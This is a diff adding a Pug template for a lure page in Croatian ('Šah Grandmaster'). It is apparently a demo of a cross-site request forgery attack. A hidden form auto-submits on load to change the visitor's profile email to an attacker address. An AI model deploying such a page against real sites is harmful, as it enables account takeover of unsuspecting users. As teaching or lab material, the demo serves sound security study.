@@ -1,0 +1,10 @@
+html
+  head
+    title Šah Grandmaster
+  body
+    h1 Postani Grandmaster u šahu sa samo jednim klikom!
+    p U pozadini se šalje maliciozni zahtjev na aplikaciju...
+    form#evil(action="/profile/email" method="post")
+      input(type="hidden" name="email" value="hakirani@mail.com")
+    script.
+      document.getElementById('evil').submit();
